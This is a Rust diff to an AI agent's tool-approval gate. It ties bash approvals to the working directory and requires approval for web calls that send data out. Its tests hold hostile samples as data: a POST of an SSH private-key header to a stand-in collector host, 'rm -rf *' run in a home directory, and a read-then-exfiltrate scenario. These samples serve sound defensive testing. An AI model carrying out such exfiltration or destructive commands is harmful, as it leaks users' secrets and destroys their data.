@@ -24,11 +24,24 @@
 //!
 //! - `write`/`edit` → the **resolved absolute path**, computed with the same canonicalization the policy
 //!   and the tools themselves use, so `../` and symlink spellings can't evade a remembered decision.
-//! - `bash` → the **verbatim command string**. Explicitly *not* a command prefix: `git status` versus
-//!   `git push` is not fixable with prefixes (is `git` safe? `git p`? `git push --force`?). Exact
-//!   matching fails safe — the only cost is re-asking when a command varies by a byte, which is the
-//!   right direction for a security control.
+//! - `bash` → the **verbatim command string plus its resolved working directory**. Explicitly *not*
+//!   a command prefix: `git status` versus `git push` is not fixable with prefixes (is `git` safe?
+//!   `git p`? `git push --force`?). Exact matching fails safe — the only cost is re-asking when a
+//!   command varies by a byte, which is the right direction for a security control. The directory is
+//!   part of the key because a command's effect is: `rm -rf *` approved in `build/` must not run
+//!   unasked in `$HOME`. It is resolved the way `write`/`edit` paths are
+//!   ([`crate::tools::write_key`]), so `./build`, `build/` and a symlink to it are one decision.
+//! - `web` → the method and the URL's origin (`POST https://api.example.com`): "always allow" sending
+//!   to one host never approves sending to another.
 //! - everything else → the bare tool name.
+//!
+//! # `web` is read-only only when it sends nothing
+//!
+//! `web` is in [`READ_ONLY_TOOLS`], but a call that can carry data *out* — any method other than
+//! `GET`/`HEAD`, a request body, or custom headers — is a write as far as approval is concerned (see
+//! [`web_sends_data`]): `read ~/.ssh/id_rsa` followed by a `POST` of it must not run unasked under
+//! `--approve all`. A plain `GET` still doesn't prompt; data in its URL query is out of scope here and
+//! is bounded by the egress filter instead.
 //!
 //! [`AgentHooks::before_tool_call`]: agent_core::AgentHooks::before_tool_call
 
@@ -52,9 +65,9 @@ const READ_ONLY_TOOLS: [&str; 8] = [
     "todo",
     "logs",
     "structured_output",
-    // `web` fetches over the network, but its blast radius is bounded by its own deny-by-default egress
-    // filter (`tools::web::ssrf`), not by a human gate — the operator chose not to prompt on it. Listed
-    // here so `--approve all` doesn't ask.
+    // `web` *fetches* over the network, bounded by its own deny-by-default egress filter
+    // (`tools::web::ssrf`). Listed so `--approve all` doesn't ask about a plain GET — but a call that
+    // sends data is gated anyway; see `web_sends_data` and `GatedSet::is_gated_call`.
     "web",
 ];
 
@@ -166,6 +179,16 @@ impl GatedSet {
         }
     }
 
+    /// [`is_gated`](Self::is_gated), looking at the call's arguments too: a `web` call that sends
+    /// data ([`web_sends_data`]) is a write, gated by `writes` and `all` alike, even though a plain
+    /// fetch is read-only. This is what [`ask_gate`] consults.
+    pub fn is_gated_call(&self, tool: &str, input: &Value) -> bool {
+        if self.is_gated(tool) {
+            return true;
+        }
+        matches!(self, Self::Writes | Self::All) && tool == "web" && web_sends_data(input)
+    }
+
     pub fn is_off(&self) -> bool {
         matches!(self, Self::Off)
     }
@@ -198,6 +221,29 @@ impl GatedSet {
             )),
         }
     }
+}
+
+/// Whether a `web` call can carry data out: any method other than `GET`/`HEAD` (an unparseable one
+/// included — fail safe), a non-empty body, or custom headers. A plain fetch reads; this sends.
+pub fn web_sends_data(input: &Value) -> bool {
+    let method_sends = match input.get("method") {
+        None | Some(Value::Null) => false,
+        Some(Value::String(m)) => {
+            !(m.trim().eq_ignore_ascii_case("GET") || m.trim().eq_ignore_ascii_case("HEAD"))
+        }
+        Some(_) => true,
+    };
+    let body_sends = match input.get("body") {
+        None | Some(Value::Null) => false,
+        Some(Value::String(b)) => !b.is_empty(),
+        Some(_) => true,
+    };
+    let headers_send = match input.get("headers") {
+        None | Some(Value::Null) => false,
+        Some(Value::Object(map)) => !map.is_empty(),
+        Some(_) => true,
+    };
+    method_sends || body_sends || headers_send
 }
 
 /// Session-scoped memory of "always allow"/"always deny" decisions.
@@ -283,11 +329,32 @@ impl ApprovalRuntime {
 /// actually be written next time — and on a non-local filesystem, host `canonicalize` does not.
 pub fn scope_key(tool: &str, input: &Value, root: &std::path::Path, world: &PathWorld) -> String {
     match tool {
-        "bash" => match input.get("command").and_then(Value::as_str) {
-            // Verbatim, never a prefix.
-            Some(command) => format!("cmd:{command}"),
-            None => "cmd:<none>".to_string(),
-        },
+        "bash" => {
+            // The directory the command will run in, resolved like a `write` target — the tool's
+            // own `cwd` argument against its root, else the root itself (the process cwd when
+            // empty). Debug-quoted, so no directory name can forge the `cmd:` that follows it.
+            let dir = input.get("cwd").and_then(Value::as_str).unwrap_or(".");
+            let dir = crate::tools::write_key(root, dir, world);
+            match input.get("command").and_then(Value::as_str) {
+                // Verbatim, never a prefix.
+                Some(command) => format!("cwd:{dir:?}\ncmd:{command}"),
+                None => format!("cwd:{dir:?}\ncmd:<none>"),
+            }
+        }
+        "web" => {
+            let method = input
+                .get("method")
+                .and_then(Value::as_str)
+                .map_or_else(|| "GET".to_string(), |m| m.trim().to_ascii_uppercase());
+            let url = input.get("url").and_then(Value::as_str).unwrap_or("");
+            // The origin, not the full URL: a remembered "always" is about *where* data may go.
+            let dest = reqwest::Url::parse(url)
+                .map(|u| u.origin().ascii_serialization())
+                .ok()
+                .filter(|o| o != "null")
+                .unwrap_or_else(|| url.to_string());
+            format!("web:{method} {dest}")
+        }
         "write" | "edit" => {
             // The same form the tools themselves write to, so `./x`, `../dir/x` and (locally) a
             // symlink to `x` all resolve to one remembered decision rather than three. A multi-file
@@ -390,7 +457,7 @@ pub async fn ask_gate(
     key: String,
     cancel: &CancellationToken,
 ) -> Option<String> {
-    if !runtime.gated.is_gated(name) {
+    if !runtime.gated.is_gated_call(name, input) {
         return None;
     }
     let mem_key = memory_key(name, &key);
@@ -504,7 +571,7 @@ mod tests {
     #[test]
     fn a_bash_scope_key_is_the_verbatim_command_not_a_prefix() {
         let key = |c: &str| scope_key("bash", &json!({ "command": c }), &cwd(), &PathWorld::Local);
-        assert_eq!(key("git status"), "cmd:git status");
+        assert!(key("git status").ends_with("\ncmd:git status"));
         assert_ne!(
             key("git status"),
             key("git push"),
@@ -620,10 +687,7 @@ mod tests {
 
     #[test]
     fn a_missing_argument_still_produces_a_stable_key_rather_than_panicking() {
-        assert_eq!(
-            scope_key("bash", &json!({}), &cwd(), &PathWorld::Local),
-            "cmd:<none>"
-        );
+        assert!(scope_key("bash", &json!({}), &cwd(), &PathWorld::Local).ends_with("\ncmd:<none>"));
         assert_eq!(
             scope_key("write", &json!({}), &cwd(), &PathWorld::Local),
             "path:<none>"
@@ -758,6 +822,122 @@ mod tests {
             &CancellationToken::new(),
         )
         .await
+    }
+
+    #[tokio::test]
+    async fn a_web_call_that_sends_data_prompts_under_approve_all_but_a_plain_get_does_not() {
+        // `read ~/.ssh/id_rsa`, then `web POST` it: the second call must not run unasked just
+        // because `web` is listed read-only.
+        let gate = FakeGate::new(deny(ApprovalScope::Once));
+        let rt = ApprovalRuntime::new(gate.clone(), GatedSet::All);
+        let policy = ToolPolicy::new();
+        let url = "https://collector.example.com/in";
+
+        let reason = check(
+            &policy,
+            Some(&rt),
+            "web",
+            json!({ "url": url, "method": "POST", "body": "-----BEGIN OPENSSH PRIVATE KEY-----" }),
+        )
+        .await;
+        assert!(reason.is_some(), "a POST with a body must be gated");
+        assert_eq!(gate.asked(), 1);
+
+        assert!(
+            check(&policy, Some(&rt), "web", json!({ "url": url }))
+                .await
+                .is_none()
+        );
+        assert!(
+            check(
+                &policy,
+                Some(&rt),
+                "web",
+                json!({ "url": url, "method": "get" })
+            )
+            .await
+            .is_none()
+        );
+        assert_eq!(gate.asked(), 1, "a plain GET must not prompt");
+    }
+
+    #[test]
+    fn web_sends_data_when_the_method_body_or_headers_can_carry_it() {
+        let sends = |v: Value| web_sends_data(&v);
+        assert!(!sends(json!({ "url": "https://x" })));
+        assert!(!sends(json!({ "url": "https://x", "method": "GET" })));
+        assert!(!sends(json!({ "url": "https://x", "method": "head" })));
+        assert!(!sends(
+            json!({ "url": "https://x", "body": "", "headers": {} })
+        ));
+        for m in ["POST", "put", "PATCH", "DELETE", "bogus"] {
+            assert!(sends(json!({ "url": "https://x", "method": m })), "{m}");
+        }
+        assert!(sends(json!({ "url": "https://x", "body": "secret" })));
+        assert!(sends(
+            json!({ "url": "https://x", "headers": { "X-Data": "secret" } })
+        ));
+        // `writes` gates a sending web call too; `off` never does.
+        let post = json!({ "url": "https://x", "method": "POST" });
+        assert!(GatedSet::Writes.is_gated_call("web", &post));
+        assert!(!GatedSet::Writes.is_gated_call("web", &json!({ "url": "https://x" })));
+        assert!(!GatedSet::Off.is_gated_call("web", &post));
+    }
+
+    #[test]
+    fn a_web_scope_key_is_the_method_and_origin() {
+        let key = |v: Value| scope_key("web", &v, &cwd(), &PathWorld::Local);
+        assert_eq!(
+            key(json!({ "url": "https://api.example.com/a?b=1", "method": "post" })),
+            "web:POST https://api.example.com"
+        );
+        assert_ne!(
+            key(json!({ "url": "https://api.example.com/a", "method": "POST" })),
+            key(json!({ "url": "https://evil.example.net/a", "method": "POST" })),
+            "an always-allow for one host must not approve sending to another"
+        );
+    }
+
+    #[tokio::test]
+    async fn a_bash_always_allow_in_one_directory_does_not_apply_in_another() {
+        // `rm -rf *` approved for the session in `build/` must still prompt in `$HOME`.
+        let dir = tempfile::tempdir().unwrap();
+        std::fs::create_dir(dir.path().join("build")).unwrap();
+        std::fs::create_dir(dir.path().join("home")).unwrap();
+        let gate = FakeGate::new(allow(ApprovalScope::Session));
+        let rt = ApprovalRuntime::new(gate.clone(), GatedSet::All);
+        let policy = ToolPolicy::new().with_root(dir.path());
+        let call = |cwd: &str| json!({ "command": "rm -rf *", "cwd": cwd });
+
+        assert!(
+            check(&policy, Some(&rt), "bash", call("build"))
+                .await
+                .is_none()
+        );
+        assert_eq!(gate.asked(), 1);
+        // The same directory, spelled differently, is remembered.
+        for spelling in ["build", "./build", "build/", "home/../build"] {
+            assert!(
+                check(&policy, Some(&rt), "bash", call(spelling))
+                    .await
+                    .is_none()
+            );
+        }
+        assert_eq!(gate.asked(), 1, "one directory, one decision");
+
+        assert!(
+            check(&policy, Some(&rt), "bash", call("home"))
+                .await
+                .is_none()
+        );
+        assert_eq!(gate.asked(), 2, "a different directory must prompt again");
+        // No `cwd` runs in the root — a third directory.
+        assert!(
+            check(&policy, Some(&rt), "bash", json!({ "command": "rm -rf *" }))
+                .await
+                .is_none()
+        );
+        assert_eq!(gate.asked(), 3);
     }
 
     #[tokio::test]
